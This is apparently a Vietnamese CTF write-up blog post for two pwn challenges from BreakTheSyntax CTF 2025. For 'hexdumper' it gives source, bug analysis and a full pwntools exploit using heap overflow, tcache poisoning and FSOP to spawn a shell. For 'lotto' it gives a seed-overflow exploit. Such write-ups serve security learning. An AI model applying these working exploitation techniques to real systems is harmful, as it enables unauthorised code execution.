--- 
title: BreakTheSyntax CTF 2025
date: 2025-05-18 00:00:00 +0800
categories: [writeup]
tags: [pwn]
author: "kuvee"
layout: post
---

## hexdumper

1 bài heap khá dài và trong giải mình không làm được T_T 


- ta sẽ có 8 option chính ở bài này 


```c
#include <stdio.h>
#include <stdlib.h>
#include <memory.h>


#define MAX_DUMPS 0x41
#define MAX_DUMP_SIZE 0x4141

// Georgia 16 by Richard Sabey 8.2003
char logo[] = \
"____    ____                         ________                                                      \n"
"`MM'    `MM'                         `MMMMMMMb.                                                    \n"
" MM      MM                           MM    `Mb                                                    \n"
" MM      MM   ____  ____   ___        MM     MM ___   ___ ___  __    __  __ ____     ____  ___  __ \n"
" MM      MM  6MMMMb `MM(   )P'        MM     MM `MM    MM `MM 6MMb  6MMb `M6MMMMb   6MMMMb `MM 6MM \n"
" MMMMMMMMMM 6M'  `Mb `MM` ,P          MM     MM  MM    MM  MM69 `MM69 `Mb MM'  `Mb 6M'  `Mb MM69   \n"
" MM      MM MM    MM  `MM,P           MM     MM  MM    MM  MM'   MM'   MM MM    MM MM    MM MM'    \n"
" MM      MM MMMMMMMM   `MM.           MM     MM  MM    MM  MM    MM    MM MM    MM MMMMMMMM MM     \n"
" MM      MM MM         d`MM.          MM     MM  MM    MM  MM    MM    MM MM    MM MM       MM     \n"
" MM      MM YM    d9  d' `MM.         MM    .M9  YM.   MM  MM    MM    MM MM.  ,M9 YM    d9 MM     \n"
"_MM_    _MM_ YMMMM9 _d_  _)MM_       _MMMMMMM9'   YMMM9MM__MM_  _MM_  _MM_MMYMMM9   YMMMM9 _MM_    \n"
"                                                                          MM                       \n"
"                                                                          MM                       \n"
"                                                                         _MM_                      \n";

size_t no_dumps = 0;
void *dumps[MAX_DUMPS];
size_t dump_sizes[MAX_DUMPS];

void make_me_a_ctf_challenge(void) {
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
}

void menu(void) {
    puts("=========== DUMP MENU ===========");
    puts("1) Create a new dump");
    puts("2) Hexdump a dump");
    puts("3) Bite a byte");
    puts("4) Merge two dumps");
    puts("5) Resize dump");
    puts("6) Remove dump");
    puts("7) Dump all dumps");
    puts("8) Dump the dump menu");
    puts("0) Coredump");
}

void create_dump(void) {
    if (no_dumps >= MAX_DUMPS) {
        puts("\tExceeded maximum dump limit!");
        return;
    }

    size_t dump_size = 0;
    printf("\tDump size: ");
    scanf("%lu", &dump_size);
    if (dump_size > MAX_DUMP_SIZE) {
        printf("\tYour dump is too big! %lu > %lu\n",
               dump_size,
               (size_t)MAX_DUMP_SIZE);
        return;
    }

    void *dump = malloc(dump_size);
    if (dump == NULL) {
        puts("Something went very wrong, contact admins");
        exit(-1);
    }
    memset(dump, 0, dump_size);
    
    size_t free_dump_idx = 0;
    while (dumps[free_dump_idx] != NULL) ++free_dump_idx;
    dumps[free_dump_idx] = dump;
    dump_sizes[free_dump_idx] = dump_size;
    ++no_dumps;

    printf("\tSuccessfully created a dump at index %lu\n", free_dump_idx);
}

int ask_for_index(void) {
    int idx = -1;

    printf("\tDump index: ");
    scanf("%d", &idx);
    if (idx >= MAX_DUMPS) {
        puts("\tIndex is too big");
        return -1;
    }

    return idx;
}

void hexdump_dump(void) {
    int idx = ask_for_index();
    if (idx == -1)
        return;

    char *dump = dumps[idx];
    if (dump == NULL) {
        printf("\tDump with index %d doesn't exist\n", idx);
        return;
    }
    size_t len = dump_sizes[idx];

    puts("");
    puts("          0  1  2  3  4  5  6  7  8  9  a  b  c  d  e  f");
    puts("     +--------------------------------------------------");
    for (size_t i = 0; i < len; ++i) {
        if (i % 16 == 0) {
            // Avoid newline for first line
            if (i != 0)
                putchar('\n');
            printf("%04lx |  ", i);
        }
        printf(" %02hhX", dump[i]);
    }
    putchar('\n');
}

void change_byte(void) {
    int idx = ask_for_index();
    if (idx == -1)
        return;
    unsigned char *dump = dumps[idx];
    if (dump == NULL) {
        printf("\tDump with index %d doesn't exist\n", idx);
        return;
    }
    size_t len = dump_sizes[idx];

    printf("\tOffset: ");
    size_t offset = 0;
    scanf("%lu", &offset);
    if (offset >= len) {
        printf("\tOffset is bigger than dump size. %lu >= %lu\n", offset, len);
        return;
    }

    printf("\tValue in decimal: ");
    unsigned char byte = 0;
    scanf("%hhu", &byte);
    dump[offset] = byte;
    printf("\tByte at offset %lu changed successfully\n", offset);
}

void merge_dumps(void) {
    int idx1 = ask_for_index();
    if (idx1 == -1)
        return;
    if (dumps[idx1] == NULL) {
        printf("\tDump with index %d doesn't exist\t", idx1);
        return;
    }
    
    int idx2 = ask_for_index();
    if (idx2 == -1)
        return;
    if (dumps[idx2] == NULL) {
        printf("\tDump with index %d doesn't exist\n", idx2);
        return;
    }

    if (idx1 == idx2) {
        puts("\tCan't merge a dump with itself");
        return;
    }

    size_t len1 = dump_sizes[idx1];
    size_t len2 = dump_sizes[idx2];
    size_t new_len = len1 + len2;
    if (new_len > MAX_DUMP_SIZE) {
        printf("\tMerged size is too big! %lu > %lu\n",
               new_len,
               (size_t)MAX_DUMP_SIZE);
        return;
    }
    dumps[idx1] = realloc(dumps[idx1], len1+len2);    //
    dump_sizes[idx1] = new_len;

    // Code from: https://en.wikipedia.org/wiki/Duff%27s_device
    register unsigned char *to = dumps[idx1]+len1, *from = dumps[idx2];
    register int count = len2;
    {
        register int n = (count + 7) / 8;
        switch (count % 8) {
        case 0: do { *to++ = *from++;
        case 7:      *to++ = *from++;
        case 6:      *to++ = *from++;
        case 5:      *to++ = *from++;
        case 4:      *to++ = *from++;
        case 3:      *to++ = *from++;
        case 2:      *to++ = *from++;
        case 1:      *to++ = *from++;
                } while (--n > 0);
        }
    }

    free(dumps[idx2]);
    dumps[idx2] = NULL;
    dump_sizes[idx2] = 0;
    --no_dumps;
    
    puts("\tMerge successful");
}

void resize_dump(void) {
    int idx = ask_for_index();
    if (idx == -1)
        return;
    if (dumps[idx] == NULL) {
        printf("\tDump with index %d doesn't exist\n", idx);
        return;
    }

    printf("\tNew size: ");
    size_t new_size = 0;
    scanf("%lu", &new_size);
    if (new_size > MAX_DUMP_SIZE) {
        printf("\tNew size is too big! %lu > %lu\n",
               new_size,
               (size_t)MAX_DUMP_SIZE);
        return;
    }
    
    size_t old_size = dump_sizes[idx];
    if (old_size < new_size) {
        dumps[idx] = realloc(dumps[idx], new_size);

        // Zero out the new memory
        size_t no_new_bytes = new_size - old_size;
        memset(dumps[idx]+old_size, 0, no_new_bytes);
    }
    
    dump_sizes[idx] = new_size;
    puts("\tResize successful");
}

void remove_dump(void) {
    int idx = ask_for_index();
    if (idx == -1)
        return;
    if (dumps[idx] == NULL) {
        printf("\tNo dump at index %d\n", idx);
        return;
    }

    free(dumps[idx]);
    dumps[idx] = NULL;
    dump_sizes[idx] = 0;
    --no_dumps;
    printf("\tDump at index %d removed successfully\n", idx);
}

void list_dumps(void) {
    for (int i = 0; i < MAX_DUMPS; ++i) {
        void *dump = dumps[i];
        size_t len = dump_sizes[i];
        if (dump == NULL)
            continue;
        printf("%02d: size=%lu\n", i, len);
    }
}

int main() {
    make_me_a_ctf_challenge();
    printf("%s", logo);

    menu();
    for (;;) {
        putchar('\n');
        // Remember to always check the return value of stdio.h functions kids!
        // Stay safe!
        if (printf("==> ") < 0) {
            printf("error while printing !!\n");
            exit(-1);
        }
        int option = 0;
        scanf("%d", &option);
        switch (option) {
            case 1:
                create_dump();
                break;
            case 2:
                hexdump_dump();
                break;
            case 3:
                change_byte();
                break;
            case 4:
                merge_dumps();
                break;
            case 5:
                resize_dump();
                break;
            case 6:
                remove_dump();
                break;
            case 7:
                list_dumps();
                break;
            case 8:
            default:
                menu();
                break;
            case 0:
                exit(0);
        }
    }
}

```

- option1 (create_dump) :

- đầu tiên nhập vào 1 size và check < 0x4141 , tiếp theo là malloc với size này , sau đó là gán nó vào mảng chứa ptr và mảng chứa size , tiếp theo là in 16 byte và xuống dòng





```c
unsigned __int64 create_dump()
{
  size_t size; // [rsp+0h] [rbp-20h] BYREF
  __int64 i; // [rsp+8h] [rbp-18h]
  void *s; // [rsp+10h] [rbp-10h]
  unsigned __int64 v4; // [rsp+18h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  if ( (unsigned __int64)no_dumps <= 0x40 )
  {
    size = 0;
    printf("\tDump size: ");
    __isoc99_scanf("%lu", &size);
    if ( size <= 0x4141 )
    {
      s = malloc(size);
      if ( !s )
      {
        puts("Something went very wrong, contact admins");
        exit(-1);
      }
      memset(s, 0, size);
      for ( i = 0; dumps[i]; ++i )
        ;
      dumps[i] = s;
      dump_sizes[i] = size;
      ++no_dumps;
      printf("\tSuccessfully created a dump at index %lu\n", i);
    }
    else
    {
      printf("\tYour dump is too big! %lu > %lu\n", size, 16705);
    }
  }
  else
  {
    puts("\tExceeded maximum dump limit!");
  }
  return v4 - __readfsqword(0x28u);
}
```

- change_byte():

nhập 1 idx và ghi 1 byte vào ptr+idx

```c
unsigned __int64 change_byte()
{
  char value; // [rsp+Bh] [rbp-25h] BYREF
  int idx; // [rsp+Ch] [rbp-24h]
  unsigned __int64 offset; // [rsp+10h] [rbp-20h] BYREF
  __int64 ptr; // [rsp+18h] [rbp-18h]
  unsigned __int64 size_ptr; // [rsp+20h] [rbp-10h]
  unsigned __int64 v6; // [rsp+28h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  idx = ask_for_index();
  if ( idx != -1 )
  {
    ptr = dumps[idx];
    if ( ptr )
    {
      size_ptr = dump_sizes[idx];
      printf("\tOffset: ");
      offset = 0;
      __isoc99_scanf("%lu", &offset);
      if ( offset < size_ptr )
      {
        printf("\tValue in decimal: ");
        value = 0;
        __isoc99_scanf("%hhu", &value);
        *(_BYTE *)(ptr + offset) = value;
        printf("\tByte at offset %lu changed successfully\n", offset);
      }
      else
      {
        printf("\tOffset is bigger than dump size. %lu >= %lu\n", offset, size_ptr);
      }
    }
    else
    {
      printf("\tDump with index %d doesn't exist\n", idx);
    }
  }
  return v6 - __readfsqword(0x28u);
}
```

- merge_dumps()

- hàm này sẽ xảy ra `bug` , ta sẽ được nhập 2 `idx` và tính toán check tổng 2 size <= 0x4141 , sau đó dùng `realloc` để mở rộng chunk này , tiếp theo đoạn code loằng ngoằng kia là Duff’s device, dùng switch + vòng lặp để “unroll” (mở rộng) việc copy mỗi 8 byte một lần, giúp tăng tốc so với vòng for đơn giản. tiếp theo là coppy dữ liệu của ptr2 vào chunk vừa đuọc mở rộng và free()

- đoạn code này khá ảo ma , nhưng bug xảy ra ở đây khi lenght ptr2 = 0 -> nó sẽ chạy vào thực hiện vòng lặp 1 lần -> overflow 8 bytes



```c
int merge_dumps()
{
  int result; // eax
  _BYTE *v1; // r12
  _BYTE *v2; // rbx
  int v3; // eax
  int v4; // r13d
  _BYTE *v5; // rdx
  _BYTE *v6; // rax
  _BYTE *v7; // rdx
  _BYTE *v8; // rax
  _BYTE *v9; // rdx
  _BYTE *v10; // rax
  _BYTE *v11; // rdx
  _BYTE *v12; // rax
  _BYTE *v13; // rdx
  _BYTE *v14; // rax
  _BYTE *v15; // rdx
  _BYTE *v16; // rax
  _BYTE *v17; // rdx
  _BYTE *v18; // rax
  _BYTE *v19; // rdx
  _BYTE *v20; // rax
  int v21; // [rsp+0h] [rbp-40h]
  int v22; // [rsp+4h] [rbp-3Ch]
  __int64 v23; // [rsp+8h] [rbp-38h]
  __int64 v24; // [rsp+10h] [rbp-30h]
  __int64 v25; // [rsp+18h] [rbp-28h]

  result = ask_for_index();
  v21 = result;
  if ( result != -1 )
  {
    if ( dumps[result] )
    {
      result = ask_for_index();
      v22 = result;
      if ( result != -1 )
      {
        if ( dumps[result] )
        {
          if ( v21 == result )
          {
            return puts("\tCan't merge a dump with itself");
          }
          else
          {
            v23 = dump_sizes[v21];
            v24 = dump_sizes[result];
            v25 = v23 + v24;
            if ( (unsigned __int64)(v23 + v24) <= 0x4141 )
            {
              dumps[v21] = realloc((void *)dumps[v21], v24 + v23);
              dump_sizes[v21] = v25;
              v1 = (_BYTE *)(dumps[v21] + v23);
              v2 = (_BYTE *)dumps[v22];
              v3 = v24 + 7;
              if ( (int)v24 + 7 < 0 )
                v3 = v24 + 14;
              v4 = v3 >> 3;
              switch ( (int)v24 % 8 )
              {
                case 0:
                  goto LABEL_14;
                case 1:
                  goto LABEL_21;
                case 2:
                  goto LABEL_20;
                case 3:
                  goto LABEL_19;
                case 4:
                  goto LABEL_18;
                case 5:
                  goto LABEL_17;
                case 6:
                  goto LABEL_16;
                case 7:
                  while ( 1 )
                  {
                    v7 = v2++;
                    v8 = v1++;
                    *v8 = *v7;
LABEL_16:
                    v9 = v2++;
                    v10 = v1++;
                    *v10 = *v9;
LABEL_17:
                    v11 = v2++;
                    v12 = v1++;
                    *v12 = *v11;
LABEL_18:
                    v13 = v2++;
                    v14 = v1++;
                    *v14 = *v13;
LABEL_19:
                    v15 = v2++;
                    v16 = v1++;
                    *v16 = *v15;
LABEL_20:
                    v17 = v2++;
                    v18 = v1++;
                    *v18 = *v17;
LABEL_21:
                    v19 = v2++;
                    v20 = v1++;
                    *v20 = *v19;
                    if ( --v4 <= 0 )
                      break;
LABEL_14:
                    v5 = v2++;
                    v6 = v1++;
                    *v6 = *v5;
                  }
                  break;
                default:
                  break;
              }
              free((void *)dumps[v22]);
              dumps[v22] = 0;
              dump_sizes[v22] = 0;
              --no_dumps;
              return puts("\tMerge successful");
            }
            else
            {
              return printf("\tMerged size is too big! %lu > %lu\n", v25, 16705);
            }
          }
        }
        else
        {
          return printf("\tDump with index %d doesn't exist\n", result);
        }
      }
    }
    else
    {
      return printf("\tDump with index %d doesn't exist\t", result);
    }
  }
  return result;
}
```

- resize_dump : 

hàm này mở rộng ptr ra , không có gì đặc biệt 

```c
unsigned __int64 resize_dump()
{
  int v1; // [rsp+Ch] [rbp-24h]
  size_t size; // [rsp+10h] [rbp-20h] BYREF
  size_t v3; // [rsp+18h] [rbp-18h]
  size_t n; // [rsp+20h] [rbp-10h]
  unsigned __int64 v5; // [rsp+28h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  v1 = ask_for_index();
  if ( v1 != -1 )
  {
    if ( dumps[v1] )
    {
      printf("\tNew size: ");
      size = 0;
      __isoc99_scanf("%lu", &size);
      if ( size <= 0x4141 )
      {
        v3 = dump_sizes[v1];
        if ( v3 < size )
        {
          dumps[v1] = realloc((void *)dumps[v1], size);
          n = size - v3;
          memset((void *)(dumps[v1] + v3), 0, size - v3);
        }
        dump_sizes[v1] = size;
        puts("\tResize successful");
      }
      else
      {
        printf("\tNew size is too big! %lu > %lu\n", size, 16705);
      }
    }
    else
    {
      printf("\tDump with index %d doesn't exist\n", v1);
    }
  }
  return v5 - __readfsqword(0x28u);
}
```

- ngoài ra cũng còn 1 bug xảy ra ở hàm `ask_for_index` , ở đây input() là kiểu int và check < 0 nhưng khi return thì nó lại ép kiểu về uint -> ta có thể nhập số âm (obb read-write)
```c
__int64 ask_for_index()
{
  int v1; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  v1 = -1;
  printf("\tDump index: ");
  __isoc99_scanf("%d", &v1);
  if ( v1 <= 64 )
    return (unsigned int)v1;
  puts("\tIndex is too big");
  return 0xFFFFFFFFLL;
}
```

- và sẽ có 2 cách khai thác ở bài này tương ứng với 2 bug tìm được

- đầu tiên sẽ là tạo 3 chunk -> 0x10 , 0x18 , 0x10 , tiếp theo ta sẽ ghi 1 size fake vào chunk đầu tiên -> thay đổi size chunk này thành 0 -> gộp chunk đầu tiên vào thứ hai 


- kết quả , lúc này ta gần như đã hoàn tất bài này , dựa vào điều này ta có thể read-write arbitrary các chunk gần chunk thứ `3` 

![image](https://hackmd.io/_uploads/SkUhlSk-lg.png)

- tiếp theo là malloc 1 chunk với size > tcache để leak libc , lúc này chunk ta vừa trigger là `0x558daf0d12d0` 


![image](https://hackmd.io/_uploads/Sk5N-ry-el.png)

- chunk 0x1000 sau khi malloc là `0x558daf0d1300` , vậy ta hoàn toàn có thể read libc từ chunk thứ ba , tương tự như vậy ta cũng có thể làm với leak heap 

![image](https://hackmd.io/_uploads/rJkoWBkWex.png)


- từ đây ta cũng leak heap tương tự libc , malloc các chunk và free vào tcache -> `tcache-poisioning` bằng `change_byte` và cuối cùng là get shell với `FSOP`


exp: 

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from subprocess import check_output
from time import sleep

from pwn import *

context.terminal = [
    "wt.exe",
    "-w",
    "0",
    "split-pane",
    "-d",
    ".",
    "wsl.exe",
    "-d",
    "kali-linux",
    "--",
    "bash",
    "-c",
]
context.update(arch="amd64", os="linux")
context.log_level = "debug"

exe = context.binary = ELF("./hexdumper_patched", checksec=False)
libc = ELF("./libc.so.6")

log_levels = ["info", "error", "warn", "debug"]
info = lambda msg: log.info(msg)
error = lambda msg: log.error(msg)
warn = lambda msg: log.warn(msg)
debug = lambda msg: log.debug(msg)


def one_gadget(filename, base_addr=0):
    return [
        int(i) + base_addr
        for i in check_output(["one_gadget", "--raw", "-l0", filename]).decode().split()
    ]


s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: (
    proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: (
    proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
)
sn = lambda num, proc=None: (
    proc.send(str(num).encode()) if proc else p.send(str(num).encode())
)
sna = lambda msg, num, proc=None: (
    proc.sendafter(msg, str(num).encode())
    if proc
    else p.sendafter(msg, str(num).encode())
)
sln = lambda num, proc=None: (
    proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
)
slna = lambda msg, num, proc=None: (
    proc.sendlineafter(
        msg,
        str(num).encode(),
    )
    if proc
    else p.sendlineafter(msg, str(num).encode())
)


def logbase():
    log.info("libc base = %#x" % libc.address)


def rcu(d1, d2=0):
    p.recvuntil(d1, drop=True)
    if d2:
        return p.recvuntil(d2, drop=True)


gdbscript = """
brva 0x000000000000137E
brva 0x00000000000015EC
brva 0x00000000000016C7
brva 0x0000000000001725
brva 0x00000000000018D3
brva 0x0000000000001BE7
brva 0x0000000000001CFA
brva 0x0000000000001CB8
c
"""


def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


p = start()


def menu(option):
    sla(b"==> ", str(option).encode())


def add(size):
    menu(1)
    sla(b"Dump size: ", str(size).encode())
    p.recvuntil(b"at index ")
    return int(p.recvline())


def free(idx):
    menu(6)
    sla(b"Dump index: ", str(idx).encode())


def list_dump():
    menu(7)


def edit(idx, off, byte):
    menu(3)
    sla(b"Dump index: ", str(idx).encode())
    sla(b"Offset: ", str(off).encode())
    sla(b"Value in decimal: ", str(byte).encode())


def change_bytes(idx, offset, val):
    for i, byte in enumerate(val):
        edit(idx, offset + i, byte)


def merge(idx1, idx2):
    menu(4)
    sla(b"Dump index: ", str(idx1).encode())
    sla(b"Dump index: ", str(idx2).encode())


def resize(idx, newsize):
    menu(5)
    sla(b"Dump index: ", str(idx).encode())
    sla(b"New size: ", str(newsize).encode())


def show(idx):
    menu(2)
    sla("Dump index: ", str(idx).encode())


def exploit():
    a = add(16)  # 1
    b = add(24)  # 2
    c = add(16)  # 3
    change_bytes(a, 0, p64(0x411))
    resize(a, 0)
    merge(b, a)

    free(c)
    c = add(0x400)
    change_bytes(c, 16 + 8, p64(0x0000000000020D11))
    # leak libc
    libc_leak = add(0x1000)
    # tranh gop chunk
    nothing = add(32)

    free(libc_leak)

    show(c)
    p.recvlines(5)
    leak = p.recvline()
    libc = leak[9:26].split(b" ")
    s = "".join(x.decode() for x in libc)

    rev = int("0x" + "".join([s[i : i + 2] for i in range(0, len(s), 2)][::-1]), 16)
    libc_base = rev - 0x211B20
    info(f"libc_base: {hex(libc_base)}")
    # prepare tcache attack
    d = add(0xF0 - 8)
    e = add(0xF0 - 8)
    f = add(0xF0 - 8)
    g = add(0xF0 - 8)
    free(g)
    show(c)

    p.recvlines(50)
    # leak heap 
    heap_leak = p.recvline()[9:26].split(b" ")
    s = "".join(x.decode() for x in heap_leak)
    rev = int("0x" + "".join([s[i : i + 2] for i in range(0, len(s), 2)][::-1]), 16)
    heap_base = rev * 0x1000
    info(f"heap base: {hex(heap_base)}")

    free(f)
    free(e)
    free(d)
    stderr = libc_base + 0x2124E0
    input("tcache attack")
    change_bytes(c, 0x20, p64(stderr ^ (heap_base >> 12)))
    x = add(0xF0 - 8)

    win = add(0xF0 - 8)
    
    # FSOP from ptr_yudai
    file = FileStructure(0)
    file.flags = u64(p32(0xFBAD0101) + b";sh\0")
    file._IO_save_end = libc_base + 0x5AF30
    file._lock = stderr - 0x10
    file._wide_data = stderr - 0x10
    file._offset = 0
    file._old_offset = 0
    file.unknown2 = (
        b"\x00" * 24
        + p32(1)
        + p32(0)
        + p64(0)
        + p64(stderr - 0x10)
        + p64(libc_base + 0x2101E8 + 0x18 - 0x58)
    )
    change_bytes(win, 0, bytes(file))
    sl(b"id")
    sl(b"id")
    sl(b"echo 'got shell'")
    p.interactive()


if __name__ == "__main__":
    exploit()
```

- còn 1 cách nữa là `IOF` ở hàm input `idx` , ta có thể đọc ở đây [tls_dtorlist](https://4f3rg4n.github.io/ctf%20writeups/pwn/hexdumper/)



## lotto

- bài này chỉ là overflow seed nên không có gì đáng nói 

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  size_t v3; // rax
  unsigned int v4; // eax
  int i; // [rsp+4h] [rbp-33Ch]
  int j; // [rsp+8h] [rbp-338h]
  int k; // [rsp+Ch] [rbp-334h]
  __int128 v9; // [rsp+10h] [rbp-330h] BYREF
  _QWORD v10[50]; // [rsp+20h] [rbp-320h] BYREF
  char s[376]; // [rsp+1B0h] [rbp-190h] BYREF
  __int16 v12; // [rsp+328h] [rbp-18h]
  char v13; // [rsp+32Ah] [rbp-16h]
  unsigned __int64 v14; // [rsp+338h] [rbp-8h]

  v14 = __readfsqword(0x28u);
  memset(&v10[2], 0, 379);
  v9 = 0;
  v10[0] = 0;
  *(_DWORD *)((char *)&v10[40] + 7) = 0;
  getrandom((char *)&v10[40] + 7, 4, 0);
  *(_QWORD *)((char *)&v10[6] + 4) = *(_QWORD *)"    .____           __    __          \n"
                                                "    |    |    _____/  |__/  |_  ____  \n"
                                                "    |    |   /  _ \\   __\\   __\\/    \\ \n"
                                                "    |    |__(  <_> )  |  |  | (  <_> )\n"
                                                "    |_______ \\____/|__|  |__|  \\____/ \n"
                                                "            \\/                        \n"
                                                "    Enter 6 numbers in range 1 to 49   \n";
  *(_QWORD *)((char *)&v10[39] + 7) = *(_QWORD *)&aUUUUUU[-16];
  qmemcpy(
    &v10[7],
    &asc_2008[-((char *)&v10[6] + 4 - (char *)&v10[7])],
    8LL * ((((unsigned int)((char *)&v10[6] + 4 - (char *)&v10[7]) + 275) & 0xFFFFFFF8) >> 3));
  strcpy((char *)&v10[41] + 3, "    Better luck next time ;)  \n");
  strcpy((char *)&v10[45] + 3, "    Number of correct guesses: ");
  setbuf(_bss_start, 0);
  printf("%s\n    ", (const char *)&v10[6] + 4);
  memset(s, 0, sizeof(s));
  v12 = 0;
  v13 = 0;
  fgets(s, 379, stdin);
  v3 = strlen(s);
  memcpy((char *)&v10[2] + 4, s, v3);
  srand(*(unsigned int *)((char *)&v10[40] + 7));
  __isoc99_sscanf(
    (char *)&v10[2] + 4,
    "%u %u %u %u %u %u",
    &v9,
    (char *)&v9 + 4,
    (char *)&v9 + 8,
    (char *)&v9 + 12,
    v10,
    (char *)v10 + 4);
  for ( i = 0; i <= 5; ++i )
    winingNumbers[i] = rand() % 49 + 1;
  for ( j = 0; j <= 5; ++j )
  {
    ++userLookup[*((unsigned int *)&v10[-2] + j)];
    ++winingLookup[winingNumbers[j]];
  }
  for ( k = 0; k <= 48; ++k )
  {
    if ( userLookup[k] && winingLookup[k] )
    {
      v4 = userLookup[k];
      if ( winingLookup[k] <= v4 )
        v4 = winingLookup[k];
      LODWORD(v10[2]) += v4;
    }
  }
  if ( LODWORD(v10[2]) == 6 )
  {
    system("cat flag");
  }
  else
  {
    printf("%s%u\n", (const char *)&v10[45] + 3, LODWORD(v10[2]));
    puts((const char *)&v10[41] + 3);
  }
  return 0;
}
```

exp: 

```python
def exploit():
    offs = 0x133
    glibc.srand(1633771873)
    val = [0] * 6
    payload = b""
    for i in range(6):
        val[i] = glibc.rand() % 49 + 1
        print(f"val: {val[i]}")
        payload += str(val[i]).encode() + b" "
    input()
    sl(payload.ljust(0x133, b"a") + b"aaaa")
    p.interactive()

```